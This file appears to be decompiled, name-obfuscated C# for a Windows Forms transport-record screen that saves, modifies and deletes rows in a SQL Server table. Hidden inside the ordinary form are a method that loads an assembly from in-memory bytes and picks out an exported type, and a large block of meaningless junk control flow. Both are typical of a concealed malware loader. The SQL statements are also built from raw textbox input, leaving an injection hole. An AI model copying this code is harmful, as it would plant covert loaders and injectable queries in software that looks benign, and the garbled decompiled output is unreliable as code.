using System;
using System.ComponentModel;
using System.Data.SqlClient;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Bm4r;
using Cr4;
using Jo7k;
using Kc9;
using Lo03;
using Microsoft.VisualBasic.CompilerServices;
using Na4o;
using Sd9;
using Wf0t;
using Yf06;
using Yn19;
using Yn6o;
using b3YP;
using c9S;
using i1QX;
using i9XQ;
using k2CM;
using k3R;
using q9Z2;

namespace Ti18;

[DesignerGenerated]
public class Es6d : Form
{
	private IContainer components;

	private string cs;

	private SqlConnection cn;

	private SqlCommand cmd;

	private SqlDataReader rd;

	internal virtual Button btnSave
	{
		[CompilerGenerated]
		get
		{
			return _btnSave;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = c0QM;
			Button val = _btnSave;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnSave = value;
			val = _btnSave;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("txtTid")]
	internal virtual TextBox txtTid
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label2")]
	internal virtual Label Label2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label3")]
	internal virtual Label Label3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label4")]
	internal virtual Label Label4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtTCost")]
	internal virtual TextBox txtTCost
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtTDistance")]
	internal virtual TextBox txtTDistance
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("txtTMode")]
	internal virtual TextBox txtTMode
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label5")]
	internal virtual Label Label5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Label Label6
	{
		[CompilerGenerated]
		get
		{
			return _Label6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = q8ME;
			Label label = _Label6;
			if (label != null)
			{
				((Control)label).remove_Click(eventHandler);
			}
			_Label6 = value;
			label = _Label6;
			if (label != null)
			{
				((Control)label).add_Click(eventHandler);
			}
		}
	}

	internal virtual Label Label7
	{
		[CompilerGenerated]
		get
		{
			return _Label7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = d0WC;
			Label label = _Label7;
			if (label != null)
			{
				((Control)label).remove_Click(eventHandler);
			}
			_Label7 = value;
			label = _Label7;
			if (label != null)
			{
				((Control)label).add_Click(eventHandler);
			}
		}
	}

	[field: AccessedThroughProperty("DataGridView1")]
	internal virtual DataGridView DataGridView1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual Button btnModify
	{
		[CompilerGenerated]
		get
		{
			return _btnModify;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = t3G7;
			Button val = _btnModify;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnModify = value;
			val = _btnModify;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button btnDelete
	{
		[CompilerGenerated]
		get
		{
			return _btnDelete;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler = Bw2n;
			Button val = _btnDelete;
			if (val != null)
			{
				((Control)val).remove_Click(eventHandler);
			}
			_btnDelete = value;
			val = _btnDelete;
			if (val != null)
			{
				((Control)val).add_Click(eventHandler);
			}
		}
	}

	public Es6d()
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)Ae24);
		cs = "Data Source=DESKTOP-1L8UME0\\SQLEXPRESS;Initial Catalog=db_fabric;Integrated Security=True";
		cn = new SqlConnection(cs);
		cmd = new SqlCommand();
		Jq3r();
	}

	[DebuggerNonUserCode]
	protected override void Le2r(bool Dr7b)
	{
		try
		{
			if (Dr7b && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(Dr7b);
		}
	}

	[DebuggerStepThrough]
	private void Jq3r()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0090: Unknown result type (might be due to invalid IL or missing references)
		//IL_009a: Expected O, but got Unknown
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a5: Expected O, but got Unknown
		//IL_041d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0427: Expected O, but got Unknown
		//IL_04bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_04c7: Expected O, but got Unknown
		//IL_055e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0568: Expected O, but got Unknown
		btnSave = new Button();
		txtTid = new TextBox();
		Label1 = new Label();
		Label2 = new Label();
		Label3 = new Label();
		Label4 = new Label();
		txtTCost = new TextBox();
		txtTDistance = new TextBox();
		txtTMode = new TextBox();
		Label5 = new Label();
		Label6 = new Label();
		Label7 = new Label();
		DataGridView1 = new DataGridView();
		btnModify = new Button();
		btnDelete = new Button();
		((ISupportInitialize)DataGridView1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)btnSave).set_Location(new Point(160, 202));
		((Control)btnSave).set_Name("btnSave");
		((Control)btnSave).set_Size(new Size(75, 23));
		((Control)btnSave).set_TabIndex(4);
		((ButtonBase)btnSave).set_Text("SAVE");
		((ButtonBase)btnSave).set_UseVisualStyleBackColor(true);
		((Control)txtTid).set_Location(new Point(173, 40));
		((Control)txtTid).set_Name("txtTid");
		((Control)txtTid).set_Size(new Size(100, 20));
		((Control)txtTid).set_TabIndex(0);
		Label1.set_AutoSize(true);
		((Control)Label1).set_ForeColor(Color.White);
		((Control)Label1).set_Location(new Point(58, 90));
		((Control)Label1).set_Name("Label1");
		((Control)Label1).set_Size(new Size(82, 13));
		((Control)Label1).set_TabIndex(2);
		Label1.set_Text("Transport Cost :");
		Label2.set_AutoSize(true);
		((Control)Label2).set_ForeColor(Color.White);
		((Control)Label2).set_Location(new Point(58, 47));
		((Control)Label2).set_Name("Label2");
		((Control)Label2).set_Size(new Size(70, 13));
		((Control)Label2).set_TabIndex(3);
		Label2.set_Text("Transport Id :");
		Label3.set_AutoSize(true);
		((Control)Label3).set_ForeColor(Color.White);
		((Control)Label3).set_Location(new Point(46, 125));
		((Control)Label3).set_Name("Label3");
		((Control)Label3).set_Size(new Size(103, 13));
		((Control)Label3).set_TabIndex(4);
		Label3.set_Text("Transport Distance :");
		Label4.set_AutoSize(true);
		((Control)Label4).set_ForeColor(Color.White);
		((Control)Label4).set_Location(new Point(46, 158));
		((Control)Label4).set_Name("Label4");
		((Control)Label4).set_Size(new Size(88, 13));
		((Control)Label4).set_TabIndex(5);
		Label4.set_Text("Transport Mode :");
		((Control)txtTCost).set_Location(new Point(173, 83));
		((Control)txtTCost).set_Name("txtTCost");
		((Control)txtTCost).set_Size(new Size(100, 20));
		((Control)txtTCost).set_TabIndex(1);
		((Control)txtTDistance).set_Location(new Point(173, 125));
		((Control)txtTDistance).set_Name("txtTDistance");
		((Control)txtTDistance).set_Size(new Size(100, 20));
		((Control)txtTDistance).set_TabIndex(2);
		((Control)txtTMode).set_Location(new Point(173, 158));
		((Control)txtTMode).set_Name("txtTMode");
		((Control)txtTMode).set_Size(new Size(100, 20));
		((Control)txtTMode).set_TabIndex(3);
		Label5.set_AutoSize(true);
		((Control)Label5).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label5).set_ForeColor(Color.White);
		((Control)Label5).set_Location(new Point(341, 19));
		((Control)Label5).set_Name("Label5");
		((Control)Label5).set_Size(new Size(126, 17));
		((Control)Label5).set_TabIndex(8);
		Label5.set_Text("Transport Detail");
		Label6.set_AutoSize(true);
		((Control)Label6).set_BackColor(Color.Blue);
		((Control)Label6).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label6).set_ForeColor(Color.White);
		((Control)Label6).set_Location(new Point(731, 19));
		((Control)Label6).set_Name("Label6");
		((Control)Label6).set_Size(new Size(18, 17));
		((Control)Label6).set_TabIndex(9);
		Label6.set_Text("X");
		Label7.set_AutoSize(true);
		((Control)Label7).set_BackColor(Color.Blue);
		((Control)Label7).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)Label7).set_ForeColor(Color.White);
		((Control)Label7).set_Location(new Point(39, 19));
		((Control)Label7).set_Name("Label7");
		((Control)Label7).set_Size(new Size(92, 17));
		((Control)Label7).set_TabIndex(7);
		Label7.set_Text("Go To Main");
		DataGridView1.set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		((Control)DataGridView1).set_Location(new Point(32, 239));
		((Control)DataGridView1).set_Name("DataGridView1");
		((Control)DataGridView1).set_Size(new Size(599, 199));
		((Control)DataGridView1).set_TabIndex(10);
		((Control)btnModify).set_Location(new Point(268, 202));
		((Control)btnModify).set_Name("btnModify");
		((Control)btnModify).set_Size(new Size(75, 23));
		((Control)btnModify).set_TabIndex(5);
		((ButtonBase)btnModify).set_Text("MODIFY");
		((ButtonBase)btnModify).set_UseVisualStyleBackColor(true);
		((Control)btnDelete).set_Location(new Point(380, 202));
		((Control)btnDelete).set_Name("btnDelete");
		((Control)btnDelete).set_Size(new Size(75, 23));
		((Control)btnDelete).set_TabIndex(6);
		((ButtonBase)btnDelete).set_Text("DELETE");
		((ButtonBase)btnDelete).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.FromArgb(0, 0, 64));
		((Form)this).set_ClientSize(new Size(800, 450));
		((Control)this).get_Controls().Add((Control)(object)btnDelete);
		((Control)this).get_Controls().Add((Control)(object)btnModify);
		((Control)this).get_Controls().Add((Control)(object)DataGridView1);
		((Control)this).get_Controls().Add((Control)(object)Label6);
		((Control)this).get_Controls().Add((Control)(object)Label7);
		((Control)this).get_Controls().Add((Control)(object)Label5);
		((Control)this).get_Controls().Add((Control)(object)txtTMode);
		((Control)this).get_Controls().Add((Control)(object)txtTDistance);
		((Control)this).get_Controls().Add((Control)(object)txtTCost);
		((Control)this).get_Controls().Add((Control)(object)Label4);
		((Control)this).get_Controls().Add((Control)(object)Label3);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)txtTid);
		((Control)this).get_Controls().Add((Control)(object)btnSave);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("frmTransportDetail");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("frmTransportDetail");
		((ISupportInitialize)DataGridView1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
		s5C.int_0[275] = (s5C.int_0[275] * s5C.int_0[72]) & 0x12;
	}

	private void c0QM(object sender, EventArgs e)
	{
		//IL_00af: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c4: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			cn.Open();
			cmd.set_Connection(cn);
			cmd.set_CommandText("insert into tbl_transport values(" + Conversions.ToString(Conversions.ToInteger(txtTid.get_Text())) + ",'" + txtTCost.get_Text() + "'," + txtTDistance.get_Text() + ",'" + txtTMode.get_Text() + "')");
			cmd.ExecuteReader();
			MessageBox.Show("Record Saved");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.ToString());
			ProjectData.ClearProjectError();
		}
		finally
		{
			cn.Close();
		}
		m0SY();
	}

	public void m0SY()
	{
		//IL_0154: Unknown result type (might be due to invalid IL or missing references)
		DataGridView1.get_Rows().Clear();
		DataGridView1.get_Columns().Clear();
		try
		{
			cn.Open();
			cmd.set_Connection(cn);
			cmd.set_CommandText("select * from tbl_transport");
			rd = cmd.ExecuteReader();
			DataGridView1.get_Columns().Add("c1", "Transport Id");
			DataGridView1.get_Columns().Add("c2", "Transport Cost");
			DataGridView1.get_Columns().Add("c3", "Transport Distance");
			DataGridView1.get_Columns().Add("c4", "Transport Mode");
			while (rd.Read())
			{
				DataGridView1.get_Rows().Add(new object[4]
				{
					rd.get_Item("transportid").ToString(),
					rd.get_Item("transportcost"),
					rd.get_Item("transportdistance").ToString(),
					rd.get_Item("transportmode")
				});
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.ToString());
			ProjectData.ClearProjectError();
		}
		finally
		{
			cn.Close();
		}
	}

	private void d0WC(object sender, EventArgs e)
	{
		c7G c7G = new c7G();
		((Control)c7G).Show();
		((Control)this).Hide();
	}

	private void q8ME(object sender, EventArgs e)
	{
		((Component)this).Dispose();
	}

	private void Ae24(object sender, EventArgs e)
	{
		m0SY();
	}

	private void t3G7(object sender, EventArgs e)
	{
		//IL_00a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bb: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			cn.Open();
			cmd.set_Connection(cn);
			cmd.set_CommandText("update tbl_transport set transportcost ='" + txtTCost.get_Text() + "',transportdistance=" + txtTDistance.get_Text() + ",transportmode='" + txtTMode.get_Text() + "' where transportid=" + Conversions.ToString(Conversions.ToInteger(txtTid.get_Text())));
			cmd.ExecuteReader();
			MessageBox.Show("Record Modified");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.ToString());
			ProjectData.ClearProjectError();
		}
		finally
		{
			cn.Close();
		}
		m0SY();
	}

	private void Bw2n(object sender, EventArgs e)
	{
		//IL_0058: Unknown result type (might be due to invalid IL or missing references)
		//IL_006d: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			cn.Open();
			cmd.set_Connection(cn);
			cmd.set_CommandText("delete from tbl_transport where transportid=" + Conversions.ToString(Conversions.ToInteger(txtTid.get_Text())));
			cmd.ExecuteReader();
			MessageBox.Show("Record Deleted");
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.ToString());
			ProjectData.ClearProjectError();
		}
		finally
		{
			cn.Close();
		}
		m0SY();
	}

	internal static bool w6WM()
	{
		try
		{
			try
			{
				k2GS.mDic.Add(k2GS.T, Assembly.Load((byte[])k2GS.mDic[k2GS.mArray]).GetExportedTypes()[27]);
				return true;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		return false;
	}

	static void Sb64()
	{
		System.Runtime.CompilerServices.Unsafe.SkipInit(out object obj);
		try
		{
			if ((UIntPtr)Ns87.Default == (UIntPtr)(nuint)0u)
			{
				_ = (g6EQ)(object)Ns87.Default;
			}
			obj = null;
		}
		finally
		{
			try
			{
				System.Runtime.CompilerServices.Unsafe.SkipInit(out Ns87 ns);
				while ((object)Ns87.Default != null)
				{
					ns = ns;
					ns = ns;
				}
			}
			finally
			{
				try
				{
					_ = Ns87.Default;
				}
				finally
				{
					_ = (o1W)(object)Ns87.Default;
					goto IL_005f;
				}
			}
		}
		IL_005f:
		System.Runtime.CompilerServices.Unsafe.SkipInit(out q4PG q4PG);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Xj06 xj);
		if ((UIntPtr)Ns87.Default == (UIntPtr)(nuint)0u)
		{
			try
			{
				while (obj != null)
				{
					q4PG obj2 = (q4PG)(object)Ns87.Default;
					q4PG = q4PG;
					q4PG = obj2;
				}
			}
			catch
			{
				xj = xj;
				xj = xj;
			}
		}
		_ = (Cr17)(object)Ns87.Default;
		g6EQ obj4 = (g6EQ)(object)Ns87.Default;
		g6EQ g6EQ = g6EQ;
		g6EQ = obj4;
		nuint uIntPtr = uIntPtr;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out s5C s5C);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Cy1 cy);
		if (uIntPtr == (UIntPtr)(nuint)0u)
		{
			try
			{
				s5C = null;
				s5C = s5C;
			}
			catch
			{
				_ = (c7G)(object)Ns87.Default;
			}
			finally
			{
				if (uIntPtr == (UIntPtr)(nuint)0u)
				{
					Cy1 obj6 = (Cy1)(object)Ns87.Default;
					cy = (Cy1)(object)Ns87.Default;
					cy = obj6;
				}
				else
				{
					q4PG = q4PG;
				}
				goto IL_011c;
			}
		}
		goto IL_011c;
		IL_0704:
		uIntPtr = default(UIntPtr);
		if (uIntPtr == (UIntPtr)(nuint)0u)
		{
			uIntPtr = default(UIntPtr);
			if (uIntPtr == (UIntPtr)(nuint)0u)
			{
				_ = (c7G)(object)Ns87.Default;
				_ = (Cy1)(object)Ns87.Default;
				_ = (Xq90)(object)Ns87.Default;
				Sd5 sd = sd;
				sd = null;
			}
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out _003CModule_003E _003CModule_003E);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out a1HS a1HS);
		try
		{
			if (uIntPtr == (UIntPtr)(nuint)0u)
			{
				try
				{
					a1HS = a1HS;
				}
				finally
				{
					_ = (q1C3)(object)Ns87.Default;
					_003CModule_003E = _003CModule_003E;
					g6EQ = (g6EQ)(object)Ns87.Default;
					_ = (Cy1)(object)Ns87.Default;
					goto end_IL_0753;
				}
			}
			try
			{
				_ = (Sa53)Ns87.Default;
			}
			catch
			{
				s5C = s5C;
				Es6d es6d = null;
			}
			end_IL_0753:;
		}
		catch
		{
			do
			{
				if ((UIntPtr)Ns87.Default == (UIntPtr)(nuint)0u)
				{
					_ = (Xq90)(object)Ns87.Default;
				}
			}
			while ((object)Ns87.Default != null);
		}
		checked
		{
			try
			{
				while ((object)Ns87.Default != null)
				{
					_ = (f1D8)(object)Ns87.Default;
				}
			}
			catch
			{
				try
				{
					_ = Ns87.Default;
				}
				finally
				{
					if (unchecked((nuint)(UIntPtr)Ns87.Default) - unchecked((nuint)(UIntPtr)Ns87.Default) == 0)
					{
						_003CModule_003E = null;
					}
					else
					{
						cy = cy;
					}
					goto end_IL_07f8;
				}
				end_IL_07f8:;
			}
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out q1C3 q1C);
		try
		{
			_ = (s5C)(object)Ns87.Default;
		}
		finally
		{
			if (default(UIntPtr) == (UIntPtr)(nuint)0u)
			{
				try
				{
					_ = (q1J3)(object)Ns87.Default;
				}
				catch
				{
					_ = (s5C)(object)Ns87.Default;
					q1C = null;
				}
			}
			goto IL_0870;
		}
		IL_011c:
		while ((object)Ns87.Default != null)
		{
		}
		while ((object)Ns87.Default != null)
		{
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out f1D8 f1D);
		do
		{
			try
			{
				if ((UIntPtr)Ns87.Default == (UIntPtr)(nuint)0u)
				{
					_ = (c7G)(object)Ns87.Default;
					q1C = null;
					f1D = f1D;
					f1D = f1D;
					_ = (q4PG)(object)Ns87.Default;
				}
				else
				{
					_ = (a1HS)(object)Ns87.Default;
				}
			}
			catch
			{
				while (obj != null)
				{
					q1C = q1C;
				}
			}
		}
		while (obj != null);
		while (true)
		{
			if (obj != null)
			{
				if (uIntPtr == (UIntPtr)(nuint)0u)
				{
					_ = Ns87.Default;
				}
			}
			else if (obj == null)
			{
				break;
			}
		}
		if (uIntPtr == (UIntPtr)(nuint)0u)
		{
			do
			{
				uIntPtr = default(UIntPtr);
				if (uIntPtr == (UIntPtr)(nuint)0u)
				{
					_ = (Xj06)Ns87.Default;
				}
			}
			while (obj != null);
		}
		else
		{
			while (true)
			{
				if (obj != null)
				{
					_ = (a1HS)(object)Ns87.Default;
				}
				else if ((object)Ns87.Default == null)
				{
					break;
				}
			}
		}
		c7G c7G = c7G;
		c7G = c7G;
		try
		{
			while ((object)Ns87.Default != null)
			{
				while ((object)Ns87.Default != null)
				{
					_ = (Ea3q)(object)Ns87.Default;
				}
			}
		}
		catch
		{
			try
			{
				_ = (f1D8)(object)Ns87.Default;
			}
			finally
			{
				uIntPtr = default(UIntPtr);
				if (uIntPtr == (UIntPtr)(nuint)0u)
				{
					Cr17 cr = cr;
					cr = cr;
				}
				goto end_IL_0242;
			}
			end_IL_0242:;
		}
		if (uIntPtr == (UIntPtr)(nuint)0u)
		{
			while (obj != null)
			{
				do
				{
					Ea3q ea3q = null;
					ea3q = ea3q;
				}
				while (obj != null);
			}
		}
		else if ((UIntPtr)Ns87.Default == (UIntPtr)(nuint)0u)
		{
			_ = (o1W)(object)Ns87.Default;
		}
		else if (uIntPtr == (UIntPtr)(nuint)0u)
		{
			_ = (_003CModule_003E)(object)Ns87.Default;
		}
		o1W o1W;
		do
		{
			o1W = (o1W)(object)Ns87.Default;
			o1W = o1W;
		}
		while (obj != null || (object)Ns87.Default != null || (object)Ns87.Default != null);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out k2GS k2GS);
		try
		{
			_ = (Cr17)(object)Ns87.Default;
		}
		catch
		{
			try
			{
				if (uIntPtr == (UIntPtr)(nuint)0u)
				{
					k2GS = k2GS;
					k2GS = k2GS;
				}
				else
				{
					c7G = c7G;
				}
			}
			finally
			{
				do
				{
					_ = (q1C3)(object)Ns87.Default;
				}
				while ((object)Ns87.Default != null);
				goto end_IL_0306;
			}
			end_IL_0306:;
		}
		checked
		{
			do
			{
				uIntPtr = default(UIntPtr);
				if (unchecked((nuint)default(UIntPtr)) - uIntPtr != 0)
				{
					_ = (Cy1)(object)Ns87.Default;
				}
				else if (uIntPtr == 0)
				{
					q4PG = q4PG;
				}
				else
				{
					_ = (_003CModule_003E)(object)Ns87.Default;
				}
			}
			while (obj != null);
			while (obj != null)
			{
				while ((object)Ns87.Default != null)
				{
					while (obj != null)
					{
						_ = (Ea3q)(object)Ns87.Default;
					}
				}
			}
			try
			{
				System.Runtime.CompilerServices.Unsafe.SkipInit(out Es6d es6d);
				while (true)
				{
					if (obj != null)
					{
						es6d = es6d;
						es6d = es6d;
					}
					else if ((object)Ns87.Default == null)
					{
						break;
					}
				}
			}
			catch
			{
				_ = (Sa53)Ns87.Default;
			}
			try
			{
				try
				{
					_ = (o1W)(object)Ns87.Default;
				}
				catch
				{
					Ea3q ea3q = (Ea3q)(object)Ns87.Default;
					_ = (Es6d)(object)Ns87.Default;
				}
				finally
				{
					if (uIntPtr == 0)
					{
						Ea3q ea3q = (Ea3q)(object)Ns87.Default;
					}
					else
					{
						f1D = f1D;
					}
					goto end_IL_03f3;
				}
				end_IL_03f3:;
			}
			catch
			{
				uIntPtr = default(UIntPtr);
				if (uIntPtr == 0)
				{
					o1W = o1W;
				}
			}
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out Sa53 sa);
		try
		{
			while (true)
			{
				if (obj != null)
				{
					_ = (Xj06)Ns87.Default;
				}
				else if ((object)Ns87.Default == null)
				{
					break;
				}
			}
		}
		catch
		{
			if ((UIntPtr)Ns87.Default == (UIntPtr)(nuint)0u)
			{
				while (obj != null)
				{
					sa = default(Sa53);
					sa = default(Sa53);
				}
			}
		}
		if ((UIntPtr)Ns87.Default == (UIntPtr)(nuint)0u)
		{
			do
			{
				try
				{
					_ = (Xj06)Ns87.Default;
					_003CModule_003E = _003CModule_003E;
					_003CModule_003E = null;
					_ = (q4PG)(object)Ns87.Default;
				}
				finally
				{
					xj = xj;
					continue;
				}
			}
			while (obj != null);
		}
		try
		{
			while (obj != null)
			{
				try
				{
					q1C = q1C;
				}
				finally
				{
					_ = (Sd5)(object)Ns87.Default;
					continue;
				}
			}
		}
		catch
		{
			try
			{
				k2GS = k2GS;
			}
			catch
			{
				_ = (Ea3q)(object)Ns87.Default;
			}
		}
		nuint num = uIntPtr;
		uIntPtr = default(UIntPtr);
		checked
		{
			System.Runtime.CompilerServices.Unsafe.SkipInit(out Xq90 xq);
			if (num * uIntPtr == 0)
			{
				nuint num2 = uIntPtr;
				uIntPtr = default(UIntPtr);
				if (num2 - (uIntPtr - (uIntPtr + unchecked((nuint)(UIntPtr)Ns87.Default) - unchecked(uIntPtr / (nuint)(UIntPtr)Ns87.Default) - unchecked((nuint)default(UIntPtr)))) == 0)
				{
					while ((object)Ns87.Default != null)
					{
						a1HS = a1HS;
						a1HS = a1HS;
					}
				}
				else
				{
					while (obj != null)
					{
						_ = (q4PG)(object)Ns87.Default;
					}
				}
			}
			else
			{
				try
				{
					xq = xq;
					xq = xq;
				}
				catch
				{
					if (default(UIntPtr) == unchecked((UIntPtr)(nuint)0u))
					{
						_ = (s5C)(object)Ns87.Default;
						o1W = null;
						_ = (q1J3)(object)Ns87.Default;
						_ = (g6EQ)(object)Ns87.Default;
					}
				}
			}
			uIntPtr = default(UIntPtr);
			if (uIntPtr == 0)
			{
				do
				{
					try
					{
						_ = (Cy1)(object)Ns87.Default;
					}
					finally
					{
						xq = xq;
						continue;
					}
				}
				while (obj != null);
			}
			if (unchecked((UIntPtr)Ns87.Default == (UIntPtr)(nuint)0u))
			{
				try
				{
					while (obj != null)
					{
						_ = (_003CModule_003E)(object)Ns87.Default;
					}
				}
				finally
				{
					_ = (Xj06)Ns87.Default;
					goto IL_0704;
				}
			}
			try
			{
				if (unchecked((nuint)(UIntPtr)Ns87.Default) - (uIntPtr - uIntPtr) == 0)
				{
					_ = (k2GS)(object)Ns87.Default;
				}
				else
				{
					_ = (k2GS)(object)Ns87.Default;
				}
			}
			catch
			{
				if (unchecked((nuint)(UIntPtr)Ns87.Default) * uIntPtr == 0)
				{
					_ = (Xj06)Ns87.Default;
					_ = (a1HS)(object)Ns87.Default;
					_ = (Cy1)(object)Ns87.Default;
					_ = (Ea3q)(object)Ns87.Default;
				}
				else
				{
					_ = (Xq90)(object)Ns87.Default;
					_ = (Sa53)Ns87.Default;
				}
			}
			goto IL_0704;
		}
		IL_0870:
		_ = (Ea3q)(object)Ns87.Default;
		if (default(UIntPtr) == (UIntPtr)(nuint)0u)
		{
			if (default(UIntPtr) == (UIntPtr)(nuint)0u)
			{
				Ns87 ns = null;
				a1HS = a1HS;
				_ = (Xq90)(object)Ns87.Default;
				sa = sa;
			}
			else
			{
				_ = (Cy1)(object)Ns87.Default;
			}
		}
		else
		{
			while (obj != null)
			{
				_ = (Ea3q)(object)Ns87.Default;
			}
		}
	}
}
